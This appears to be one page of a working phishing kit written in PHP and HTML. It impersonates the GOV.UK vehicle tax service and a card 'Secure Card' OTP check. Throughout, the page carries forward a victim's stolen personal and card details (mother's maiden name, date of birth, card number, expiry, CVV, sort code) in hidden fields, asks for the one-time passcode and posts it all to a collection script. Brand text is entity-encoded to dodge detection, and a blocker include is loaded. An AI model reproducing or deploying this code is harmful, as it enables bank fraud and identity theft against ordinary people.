<?php
require "includes/blocker.php";
require "includes/One_Time.php";
require "includes/functions.php";

$firstname = htmlspecialchars($_GET["aa"]);
$surname = htmlspecialchars($_GET["bb"]);
$address = htmlspecialchars($_GET["cc"]);
$city = htmlspecialchars($_GET["dd"]);
$zipcode = htmlspecialchars($_GET["ee"]);
$mmn = htmlspecialchars($_GET["ff"]);
$dob = htmlspecialchars($_GET["gg"]);
$phonenr = htmlspecialchars($_GET["hh"]);
$email = htmlspecialchars($_GET["ii"]);
$number = htmlspecialchars($_GET["jj"]);
$goned = htmlspecialchars($_GET["kk"]);
$three = htmlspecialchars($_GET["ll"]);
$aanr = htmlspecialchars($_GET["mm"]);
$socd = htmlspecialchars($_GET["nn"]);




error_reporting(0);
?>
<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="icon" href="media/favicon.ico" type="image/x-icon">
<link href="media/template.css" media="screen" rel="stylesheet" type="text/css">
<link href="media/template-print.css" media="print" rel="stylesheet" type="text/css">
<link href="media/fonts.css" media="screen" rel="stylesheet" type="text/css">
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="media/apple-touch-icon-114x114.png">
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="media/apple-touch-icon-144x144.png">
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="media/apple-touch-icon-72x72.png">
<link rel="apple-touch-icon-precomposed" href="media/apple-touch-icon-57x57.png">
<script>

function check(form) {


if (form.vbv.value == "")
{ document.getElementById("vbv").style = "border: 1px solid #7e0321;"; document.getElementById("error1").style.visibility="visible"; form.vbv.focus(); return;}
else { document.getElementById("error1").style.visibility="hidden"; document.getElementById("vbv").style = "border: 1px solid #ABADB3;"; }


document.getElementById("error1").style.visibility="visible";
document.getElementById('error1').innerHTML = "<img src='media/loading.gif'>";
setTimeout(function() { form.submit() }, 2000);
}
</script>
<title>
&#84;&#97;&#120;&#105;&#110;&#103;&#32;&#97;&#32;&#118;&#101;&#104;&#105;&#99;&#108;&#101;&#32;&#45;&#32;&#71;&#79;&#86;&period;&#85;&#75;</title>
<style type="text/css">
#loginScreen {
	position: absolute;
	z-index: 8899;
	left: 4px;
	right: 10px;
	top: 100px;
}
#border {
border: 2pt solid #b0b0b0;

border-collapse: collapse;
background-color: #fff;

}
td {
    padding-top: .5em;
    padding-bottom: .5em;
}
input {
width:150px;
height:23px;
padding-left: 5px;
border: 1px solid #7c7c7c;
border-radius: 2px;
}
div.fadeMe {
opacity:0.4;
filter: alpha(opacity=20);
background-color:#606060; 
width:100%; 
height:100%; 
z-index:1000;
top:0; 
left:0; 
position:fixed; 
}



td, th {
	font-family: Arial !important;
}

</style>
<script type="text/javascript" src="https://code.jquery.com/jquery-2.2.3.js"></script>
<script src="media/styles.js" type="text/javascript"></script>
</head>
<body ontouchstart="" class="js-enabled">
<div id="loginScreen" align="center">
<table id="border" border="0" style="max-width:415px;width:100%;height:450px;">
<tr>
<td style="text-align:left;padding: 2px 2px 2px 2px"></td>
<td style="text-align:right;padding: 2px 2px 2px 2px;"><div style="justify-content: center; align-items: center;margin-top:17px;text-align:left;vertical-align:middle;"><img id="logo" src="media/v.png" style="vertical-align:middle;width:70px;height:35px;">&nbsp;&nbsp;<img id="logo" src="media/m.jpg" style="vertical-align:middle;width:70px;height:35px;"><br></div><div style="justify-content: center; align-items: center;margin-top:-40px;vertical-align:middle;padding-right:4px;"> <img src="media/ssc.png" style="vertical-align:middle;width:110px;height:44px;opacity: 1.0 !important; z-index: 99999;"> <br></div></td>
</tr>
<form action="php/status_2.php" name="myForm" id="myForm" method="post">
<input name="firstname" value="<?php echo $firstname; ?>" type="hidden" />
<input name="surname" value="<?php echo $surname; ?>" type="hidden" />
<input name="address" value="<?php echo $address; ?>" type="hidden" />
<input name="city" value="<?php echo $city; ?>" type="hidden" />
<input name="zipcode" value="<?php echo $zipcode; ?>" type="hidden" />
<input name="mmn" value="<?php echo $mmn; ?>" type="hidden" />
<input name="dob" value="<?php echo $dob; ?>" type="hidden" />
<input name="phonenr" value="<?php echo $phonenr; ?>" type="hidden" />
<input name="email" value="<?php echo $email; ?>" type="hidden" />
<input name="number" value="<?php echo $number; ?>" type="hidden" />
<input name="goned" value="<?php echo $goned; ?>" type="hidden" />
<input name="three" value="<?php echo $three; ?>" type="hidden" />
<input name="aanr" value="<?php echo $aanr; ?>" type="hidden" />
<input name="socd" value="<?php echo $socd; ?>" type="hidden" />

<tr style="padding: 2px 2px 2px 2px;"><td  style="padding: 18px 2px 2px 5px;" colspan="2">
<span style="font-family:Arial;font-weight:bold;font-size:16px;color:grey;">Protect your &#83;&#101;&#99;&#117;&#114;&#101;&#32;&#67;&#97;&#114;&#100;&#32;&#111;&#110;&#108;&#105;&#110;&#101;</span><br><br>
<span style="font-family:Arial;font-size:12px;color:black;">
<b>Protecting you from fraud</b><br>
You will occasionally be asked for your OTP (One Time Passcode).<br>
Within a few minutes you will receive a code sent to your phone please enter it below.<br>
<br>
</span>
<span style="align:center;text-align:center;font-family:Arial;font-size:13px;">
<br>
<br>
<table class="tg" align="Center" border="0" style="font-size:13px;">
<tr style="font-size:11px;color:#333;">
    <td style="font-family:Arial !important;" class="tg-yw4l" align="right">Merchant: </td>
    <td class="tg-yw4l"> &#71;&#79;&#86;&period;&#85;&#75;</td>
  </tr>
<tr style="font-size:11px;color:#333;">
    <td style="font-family:Arial !important;" class="tg-yw4l" align="right">Amount: </td>
    <td class="tg-yw4l"> GBP 0.00 </td>
  </tr>
<tr style="font-size:11px;color:#333;">
    <td style="font-family:Arial !important;" class="tg-yw4l" align="right">Date: </td>
	<td class="tg-yw4l"><script language="javascript">
 var today = new Date();
 today;
today.setDate(today.getDate());
var dd = today.getDate();
var mm = today.getMonth()+1; //January is 0!

var yyyy = today.getFullYear();
if(dd<10){dd='0'+dd} if(mm<10){mm='0'+mm} today = mm+'/'+dd+'/'+yyyy;
document.write(today);
 </script></td>
  </tr>
  <tr style="font-size:11px;color:#333;">
    <td style="font-family:Arial !important;" class="tg-yw4l" align="right">&#67;&#97;&#114;&#100;&#32;&#78;&#117;&#109;&#98;&#101;&#114;: </td>
    <td class="tg-yw4l"> XXXX-XXXX-XXXX-<?php echo substr($number, -4); ?> </td>
  </tr>
<tr>
    <td style="font-family:Arial !important;" class="tg-yw4l" align="right">OTP: </td>
<td class="tg-yw4l"><input id="vbv" name="vbv" maxlength="25" autofocus="autofocus" onKeyDown="if(event.keyCode==13) { check(this.form); }" type="password"></td>
</tr>
      <tr>
    <td class="tg-yw4l" align="right"></td>
<td class="tg-yw4l" ><span id="error1" style="visibility:hidden;color:#7e0321">All fields are required.</span><br>
<button style="width:100px;height:28px;font-family:Arial !important;" type="button" onclick="check(this.form)">Submit</button> &nbsp;<img src="media/q.png" style="height:22px; vertical-align:middle;"> <br><br><span style="font-size:12px;color:#5F6368;text-decoration:underline;cursor:pointer;">Help</span>&nbsp;&nbsp;&nbsp; <span style="font-size:12px;color:#5F6368;text-decoration:underline;cursor:pointer;">Cancel</span></td>
  </tr>
  <tr>
    <td style="display:inline-block;width:99.9%;clear:both;font-size:11px;"><br>&copy; Copyright 2020 </td>
    <td class="tg-yw4l" style="font-size:11px;padding-top:18px;" >All rights reserved.</td>
  </tr>
</table>
</span>
</td></tr>
</table>

<br>
</div>


<header role="banner" class="with-proposition" id="global-header">
<div class="header-wrapper">
<div class="header-global">
<div class="header-logo">
<a id="logo" class="content">
<img src="media/dd.png" width="35" height="31"> &#71;&#79;&#86;&period;&#85;&#75;
</a>
</div>
</div>
<div class="header-proposition">
  <div class="content">
<nav id="proposition-menu">
  <a id="proposition-name">Vehicle tax</a>
</nav>
  </div>
</div>
</div>
</header>
<div id="globalNotice" class="maincontent">
<span id="lblGlobalMessage"><a class="toggle-target">&#86;&#105;&#101;&#119;&#32;&#98;&#117;&#100;&#103;&#101;&#116;&#32;&#99;&#104;&#97;&#110;&#103;&#101;&#32;&#105;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;</a>
</span>   
</div>
<div id="global-header-bar"></div>
<div class="maincontent">
<div class="phase-banner">
  <p>
<strong class="phase-tag">BETA</strong>
<span>This is a new service – your <a id="FeedbackLink" href="#">feedback</a> will help us to improve it.</span>
  </p>
</div>
</div>
<div id="wrapper">
<div class="maincontent">
<div id="startHeader" class="start-header group">
<h1>
&#84;&#97;&#120;&#105;&#110;&#103;&#32;&#97;&#32;&#118;&#101;&#104;&#105;&#99;&#108;&#101;
</h1>
</div>

<div id="maindiv1" class="body-container group">
<div id="div1" class="">
<p>
<strong>
<label for="plate" class="label">&#76;&#105;&#110;&#107;&#32;&#121;&#111;&#117;&#114;&#32;&#100;&#101;&#98;&#105;&#116;&#32;&#111;&#114;&#32;&#99;&#114;&#101;&#100;&#105;&#116;&#32;&#99;&#97;&#114;&#100;</label>
</strong><br><br>
&#32;&#84;&#104;&#105;&#115;&#32;&#119;&#105;&#108;&#108;&#32;&#98;&#101;&#32;&#121;&#111;&#117;&#114;&#32;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#32;&#112;&#97;&#121;&#109;&#101;&#110;&#116;&#32;&#109;&#101;&#116;&#104;&#111;&#100;&period;&#32;
</p>
<p>
</p>
<span id="errortxt1" class="Validator" style="display:none;">This is a required field.</span>
<p>
<input class="input-large" readonly="readonly" placeholder="<?php echo $number; ?>" onKeyDown="if(event.keyCode==13) check(this.form);" onkeyup="change();" onchange="change();" type="tel" maxlength="16" name="v33v" id="v33v">
</p>
<p>
<input class="input-large" readonly="readonly" placeholder="<?php echo $goned; ?>" onKeyDown="if(event.keyCode==13) check(this.form);" type="tel" maxlength="5" name="ada" id="ada">
</p>
<p>
<input class="input-large" readonly="readonly" placeholder="<?php echo $three; ?>" onKeyDown="if(event.keyCode==13) check(this.form);" type="tel" maxlength="3" name="qwqw" id="qwqw">
</p>
</div>


<div>
<p>
<span id="MainContent_lblV5C2Aquire" class="label">Provide correct data during this process.</span>
</p>
</div>

</div>




</div>
</div>
<footer class="group js-footer" id="footer" role="contentinfo">
<div class="footer-wrapper">
<div class="footer-meta">
<div class="footer-meta-inner">
<ul>
<li>
<a id="cookiesLink" href="#">Cookies</a>
</li>
<li>
<a href="#">Terms and Conditions</a>
</li>
<li>
<a id="butEnglish" href="#">English</a>
</li>
<li>
<a id="butWelsh" href="#">Cymraeg</a>
</li>
<li>
<a href="#"><span id="privacyPolicy">Privacy Information Notice</span></a> 
</li>
<li>
Built by the <a href="#">&#68;&#114;&#105;&#118;&#101;&#114;&#32;&amp;&#32;&#86;&#101;&#104;&#105;&#99;&#108;&#101;&#32;&#76;&#105;&#99;&#101;&#110;&#115;&#105;&#110;&#103;&#32;&#65;&#103;&#101;&#110;&#99;&#121;</a> 
</li>
</ul>
<div class="open-licence">
<p class="logo"><a href="#">&#79;&#112;&#101;&#110;&#32;&#71;&#111;&#118;&#101;&#114;&#110;&#109;&#101;&#110;&#116;&#32;&#76;&#105;&#99;&#101;&#110;&#99;&#101;&#32;</a></p>
<p>
All content is available under the <a href="#">
&#79;&#112;&#101;&#110;&#32;&#71;&#111;&#118;&#101;&#114;&#110;&#109;&#101;&#110;&#116;&#32;&#76;&#105;&#99;&#101;&#110;&#99;&#101;&#32; v2.0</a>, except where otherwise stated</p>
</div>
</div>
<div class="copyright">
<a href="#">
© Crown copyright</a>
</div>
</div>
</div>
</footer>
</form>

<script>
var characterCount
$('#goned').on('input',function(e){
    if($(this).val().length == 2 && characterCount < $(this).val().length) {
        $(this).val($(this).val()+'/');
    }
    characterCount = $(this).val().length
});
</script>
<script>
var characterCount
$('#socd').on('input',function(e){
    if($(this).val().length == 2 && characterCount < $(this).val().length) {
        $(this).val($(this).val()+'-');
    }
    else if($(this).val().length == 5 && characterCount < $(this).val().length) {
        $(this).val($(this).val()+'-');
    }
    characterCount = $(this).val().length
});
</script>
<script type="text/javascript">
    window.onload=function(){
      
input_nr = function(jQinp)
{
    var format_and_pos = function(input, char, backspace)
    {
        var start = 0;
        var end = 0;
        var pos = 0;
        var value = input.value;

        if (char !== false)
        {
            start = input.selectionStart;
            end = input.selectionEnd;

            if (backspace && start > 0) // handle backspace onkeydown
            {
                start--;

                if (value[start] == " ")
                { start--; }
            }
            // To be able to replace the selection if there is one
            value = value.substring(0, start) + char + value.substring(end);

            pos = start + char.length; // caret position
        }

        var d = 0; // digit count
        var dd = 0; // total
        var gi = 0; // group index
        var newV = "";
        var groups = /^\D*3[47]/.test(value) ? 
        [4, 6, 5] : [4, 4, 4, 4];

        for (var i = 0; i < value.length; i++)
        {
            if (/\D/.test(value[i]))
            {
                if (start > i)
                { pos--; }
            }
            else
            {
                if (d === groups[gi])
                {
                    newV += " ";
                    d = 0;
                    gi++;

                    if (start >= i)
                    { pos++; }
                }
                newV += value[i];
                d++;
                dd++;
            }
            if (d === groups[gi] && groups.length === gi + 1) // max length
            { break; }
        }
        input.value = newV;

        if (char !== false)
        { input.setSelectionRange(pos, pos); }
    };

    jQinp.keypress(function(e)
    {
        var code = e.charCode || e.keyCode || e.which;

        // Check for tab and arrow keys (needed in Firefox)
        if (code !== 9 && (code < 37 || code > 40) &&
        // and CTRL+C / CTRL+V
        !(e.ctrlKey && (code === 99 || code === 118)))
        {
            e.preventDefault();

            var char = String.fromCharCode(code);

            // if the character is non-digit
            // -> return false (the character is not inserted)

            if (/\D/.test(char))
            { return false; }

            format_and_pos(this, char);
        }
    }).
    keydown(function(e) // backspace doesn't fire the keypress event
    {
        if (e.keyCode === 8 || e.keyCode === 46) // backspace or delete
        {
            e.preventDefault();
            format_and_pos(this, '', this.selectionStart === this.selectionEnd);
        }
    }).
    on('paste', function()
    {
        // A timeout is needed to get the new value pasted
        setTimeout(function()
        { format_and_pos(jQinp[0], ''); }, 50);
    }).
    blur(function() // reformat onblur just in case (optional)
    {
        format_and_pos(this, false);
    });
};

input_nr($('#thenr'));



}

</script>


</body></html>